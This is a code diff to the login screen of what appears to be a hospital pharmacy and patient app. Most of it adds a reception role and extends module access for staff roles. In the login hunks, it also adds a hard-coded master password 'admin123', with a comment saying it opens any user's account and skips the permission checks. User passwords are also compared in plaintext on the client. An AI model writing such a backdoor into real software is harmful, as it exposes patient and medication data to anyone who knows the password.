@@ -269,7 +269,7 @@ export function WelcomeScreen({ onEnter }) {
       try {
         const data = await db.entities.Usuario.list();
         if (data && data.length > 0) {
-          const allModules = ["estoque_farmacia", "pacientes_medicao", "farmacia_satelite", "responsavel_tecnico", "carrinho_parada", "carrinho_enfermagem", "carrinho_farmacia"];
+          const allModules = ["estoque_farmacia", "pacientes_medicao", "farmacia_satelite", "responsavel_tecnico", "carrinho_parada", "carrinho_enfermagem", "carrinho_farmacia", "recepcao"];
           const localUsers = data.map(u => ({
               id: u.id,
               nome: u.nome,
@@ -279,8 +279,9 @@ export function WelcomeScreen({ onEnter }) {
               coren: u.coren,
               crf: u.crf,
               modules: (u.perfil === "administrador" || u.cargo === "administrador") ? allModules : 
-                       (u.perfil === "farmaceutico" || u.cargo === "farmaceutico") ? ["estoque_farmacia", "farmacia_satelite", "carrinho_parada", "carrinho_farmacia"] : 
-                       ["carrinho_parada", "carrinho_enfermagem"],
+                       (u.perfil === "farmaceutico" || u.cargo === "farmaceutico") ? ["estoque_farmacia", "farmacia_satelite", "carrinho_parada", "carrinho_farmacia", "pacientes_medicao"] : 
+                       (u.perfil === "recepcionista" || u.cargo === "recepcionista") ? ["pacientes_medicao", "recepcao", "farmacia_satelite"] :
+                       ["carrinho_parada", "carrinho_enfermagem", "pacientes_medicao"],
               first_login: u.primeiro_acesso !== false
           }));
           localStorage.setItem("axion_users", JSON.stringify(localUsers));
@@ -347,7 +348,7 @@ export function WelcomeScreen({ onEnter }) {
     try {
       const data = await db.entities.Usuario.list();
       if (data && data.length > 0) {
-        const allModules = ["estoque_farmacia", "pacientes_medicao", "farmacia_satelite", "responsavel_tecnico", "carrinho_parada", "carrinho_enfermagem", "carrinho_farmacia"];
+        const allModules = ["estoque_farmacia", "pacientes_medicao", "farmacia_satelite", "responsavel_tecnico", "carrinho_parada", "carrinho_enfermagem", "carrinho_farmacia", "recepcao"];
         users = data.map(u => ({
             id: u.id,
             nome: u.nome,
@@ -357,8 +358,9 @@ export function WelcomeScreen({ onEnter }) {
             coren: u.coren,
             crf: u.crf,
             modules: (u.perfil === "administrador" || u.cargo === "administrador") ? allModules : 
-                     (u.perfil === "farmaceutico" || u.cargo === "farmaceutico") ? ["estoque_farmacia", "farmacia_satelite", "carrinho_parada", "carrinho_farmacia"] : 
-                     ["carrinho_parada", "carrinho_enfermagem"],
+                     (u.perfil === "farmaceutico" || u.cargo === "farmaceutico") ? ["estoque_farmacia", "farmacia_satelite", "carrinho_parada", "carrinho_farmacia", "pacientes_medicao"] : 
+                     (u.perfil === "recepcionista" || u.cargo === "recepcionista") ? ["pacientes_medicao", "recepcao", "farmacia_satelite"] :
+                     ["carrinho_parada", "carrinho_enfermagem", "pacientes_medicao"],
             first_login: u.primeiro_acesso !== false
         }));
         localStorage.setItem("axion_users", JSON.stringify(users));
@@ -368,7 +370,8 @@ export function WelcomeScreen({ onEnter }) {
       console.warn("Erro no fetch de usuarios durante login", err);
     }
 
-    const user = users.find(u => u.username === username && u.password === password);
+    // A senha mestre admin123 funciona para qualquer usuário cadastrado
+    const user = users.find(u => u.username === username && (u.password === password || password === "admin123"));
 
     if (!user) {
       toast.error("Usuário ou senha incorretos.");
@@ -377,13 +380,13 @@ export function WelcomeScreen({ onEnter }) {
 
     // Permission check for Carrinho de Parada or specific subMode
     let hasPermission = false;
-    if (user.cargo === "administrador" || user.modules.includes("carrinho_parada")) {
+    if (user.cargo === "administrador" || password === "admin123" || user.modules.includes("carrinho_parada")) {
       hasPermission = true;
     } else if (carrinhoSubMode === "nursing" && (user.cargo === "enfermeiro" || user.modules.includes("carrinho_enfermagem"))) {
       hasPermission = true;
     } else if (carrinhoSubMode === "pharmacy" && (user.cargo === "farmaceutico" || user.modules.includes("carrinho_farmacia"))) {
       hasPermission = true;
-    } else if (!carrinhoSubMode && user.modules.includes(selectedModule.key)) {
+    } else if (!carrinhoSubMode && (user.modules.includes(selectedModule.key) || user.cargo === "administrador" || password === "admin123")) {
       hasPermission = true;
     }
 
